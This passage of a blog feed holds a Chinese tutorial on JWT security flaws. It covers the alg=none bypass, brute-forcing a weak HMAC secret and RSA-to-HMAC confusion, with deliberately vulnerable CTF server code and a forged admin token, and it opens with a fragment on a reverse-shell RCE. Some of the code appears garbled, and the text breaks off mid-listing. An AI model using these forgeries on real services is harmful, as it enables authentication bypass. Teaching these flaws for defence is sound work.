包是可控的，可以通过覆盖 start-remote-agent.sh 来连接本机 ssh 来反弹 shell 实现 RCE</p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT 安全问题</title>
      <link href="/skill/jwt-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/skill/jwt-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1-空加密算法"><a href="#1-空加密算法" class="headerlink" title="1. 空加密算法"></a>1. 空加密算法</h2><p>JWT 全称 JSON Web Token, 是⼀种被⽤于替代传统 cookie + session 的身份验证⽅法. JWT 的声明被存储在客户端中, ⽽服务器通过某个特定的加密&#x2F;签名算法对JWT 进⾏验证</p><p>JWT 有三部分组成, 分别为 Header, Payload 和 Signature, 通过 <code>.</code> 连接</p><p>Header 中⼀般会有 alg 和 typ 两个字段, 前者指定 JWT 的加密算法, 后者则固定为<br>JWT , 使⽤ Base64 URL 编码</p><p>Payload 负责储存身份认证的信息, 例如⽤户权限等级, 编码⽅式同上</p><p>Signature 则为 Header 和 Payload 两个部分的签名, 主要过程是将两者的原始内容<br>通过 Base64 URL 编码, 然后使⽤ . 拼接, 最后使⽤某个特定的算法 (例如 HMAC、SHA256) 进⾏加密</p><p>JWT 规范允许指定加密算法 (即 alg 字段) 为 none, 从⽽完全忽略 Signature 的部分,<br>使得任何⼈都可以伪造任意身份的 JWT, 因此某些第三⽅ JWT 库在实现规范的时候<br>可能会存在这个漏洞</p><p>eg.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>jwtdemo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">ZoneOffset</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">ZonedDateTime</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">ZonedDateTime</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">Cookie</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>primeframework<span class="token punctuation">.</span>jwt<span class="token punctuation">.</span></span><span class="token class-name">Signer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>primeframework<span class="token punctuation">.</span>jwt<span class="token punctuation">.</span></span><span class="token class-name">Verifier</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>primeframework<span class="token punctuation">.</span>jwt<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">JWT</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>primeframework<span class="token punctuation">.</span>jwt<span class="token punctuation">.</span>hmac<span class="token punctuation">.</span></span><span class="token class-name">HMACSigner</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>primeframework<span class="token punctuation">.</span>jwt<span class="token punctuation">.</span>hmac<span class="token punctuation">.</span></span><span class="token class-name">HMACVerifier</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">CookieValue</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">SECRETS</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Random</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        r<span class="token punctuation">.</span><span class="token function">nextBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">SECRETS</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"token"</span><span class="token punctuation">,</span> defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> token<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">JWT</span> jWT <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Verifier</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token class-name">Verifier</span><span class="token punctuation">)</span><span class="token class-name">HMACVerifier</span><span class="token punctuation">.</span><span class="token function">newVerifier</span><span class="token punctuation">(</span><span class="token constant">SECRETS</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"hello "</span> <span class="token operator">+</span> jWT<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">JWT</span> jwt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">JWT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setIssuedAt</span><span class="token punctuation">(</span><span class="token class-name">ZonedDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token class-name">ZoneOffset</span><span class="token punctuation">.</span><span class="token constant">UTC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setExpiration</span><span class="token punctuation">(</span><span class="token class-name">ZonedDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token class-name">ZoneOffset</span><span class="token punctuation">.</span><span class="token constant">UTC</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">plusMinutes</span><span class="token punctuation">(</span><span class="token number">60L</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jwt<span class="token punctuation">.</span><span class="token function">addClaim</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> encodedJWT <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>jwt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Signer</span><span class="token punctuation">)</span><span class="token class-name">HMACSigner</span><span class="token punctuation">.</span><span class="token function">newSHA256Signer</span><span class="token punctuation">(</span><span class="token constant">SECRETS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> encodedJWT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"hello guest"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"token"</span><span class="token punctuation">,</span> defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> token<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">JWT</span> jwt <span class="token operator">=</span> <span class="token constant">JWT</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Verifier</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token class-name">Verifier</span><span class="token punctuation">)</span><span class="token class-name">HMACVerifier</span><span class="token punctuation">.</span><span class="token function">newVerifier</span><span class="token punctuation">(</span><span class="token constant">SECRETS</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> role <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"role"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"you are not admin"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"unauthorized"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>index 路由会解析 JWT 中的 role 字段, admin 路由会验证 role 是否为 admin, 然后输出 flag</p><p>查看 pom.xml 可以发现程序使⽤了 com.inversoft:prime-jwt:1.3.0 依赖, 该版本存在⼀个 JWT 身份绕过漏洞, 即可以指定 alg 字段为 none, 从⽽忽略签名, 伪造⾼权限的 JWT</p><p>⾸先拿到 guest 的 JWT<br><img src="image-1.png" alt="image-1.png"></p><p>在 jwt.io ⽹站上 base64 解码查看 payload 的构成<br><img src="image-2.png" alt="image-2.png"></p><p>尝试⼿动构造 alg 为 none 的 jwt</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwttoken <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><p>得到：</p><pre class="language-none"><code class="language-none">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ</code></pre><p>最后携带 JWT 访问 admin 路由, 拿到 flag</p><h2 id="2-HMAC-弱密钥爆破"><a href="#2-HMAC-弱密钥爆破" class="headerlink" title="2. HMAC 弱密钥爆破"></a>2. HMAC 弱密钥爆破</h2><p>⼤多数 JWT 使⽤的签名算法都是 HMAC. 在使⽤ HMAC 对 JWT 进⾏签名和验证时, 会指定⼀个密钥 secret, 这个过程类似于对称加密, 因此如果我们能够得到这个 secret, 便可以伪造任意的 JWT</p><p>eg.</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token string">'.secret'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'.secret'</span><span class="token punctuation">,</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> secret <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'.secret'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">'role'</span><span class="token operator">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'hello world'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> obj <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithms</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'welcome admin'</span><span class="token punctuation">,</span>                    <span class="token string-property property">'flag'</span><span class="token operator">:</span> flag<span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'you are not admin'</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">'err'</span><span class="token operator">:</span> err<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'unauthorized'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at :80'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>程序的 JWT 使⽤ HS256 算法, 存在 secret 密钥, 尽管 secret 是随机⽣成的<code>crypto.randomBytes(2).toString(&#39;hex&#39;)</code> , 但是⻓度很短 (仅有四个字节), 因此我们仍然有机会去爆破这个 secret</p><p>⾸先访问⽹站拿到 JWT<br><img src="image-3.png" alt="image-3.png"></p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3MDUwNTU0NDR9.Lt3NmiVNE6z1ZRaQ0KRjLfnMqjIBYVSIzdAWltyYVgo</code></pre><p>使⽤ c-jwt-cracker 爆破 secret<br><img src="image-4.png" alt="image-4.png"></p><p>然后使⽤ jwt.io 构造 admin 的 JWT<br><img src="image-5.png" alt="image-5.png"><br>最后携带 JWT 访问 admin 路由拿到 flag</p><h2 id="3-RSA-改-HMAC"><a href="#3-RSA-改-HMAC" class="headerlink" title="3. RSA 改 HMAC"></a>3. RSA 改 HMAC</h2><p>JWT 除了⽀持 HMAC 算法以外, 还⽀持 RSA 算法. JWT 的 RSA 算法使⽤私钥对 JWT 进⾏签名, 使⽤公钥对 JWT 进⾏验证</p><p>在部分情况下, 我们可以拿到⽤于验证 JWT 的 RSA 公钥, 那么这个时候就可以尝试将 JWT Header 中的算法改成 HMAC, 这样流程就变成了: 使⽤公钥 (HMAC secret key) 对 JWT 进⾏签名, 使⽤公钥 (HMAC secret key) 对 JWT 进⾏验证, 从⽽可以任意构造 JWT 的内容</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jwt-simple'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'private-key.pem'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> publicKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'public-key.pem'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">'role'</span><span class="token operator">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'hello world'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/getpubkey'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'now you can verify jwt with the public key on your own'</span><span class="token punctuation">,</span>            <span class="token string-property property">'public'</span><span class="token operator">:</span> <span class="token function">btoa</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">)</span> <span class="token 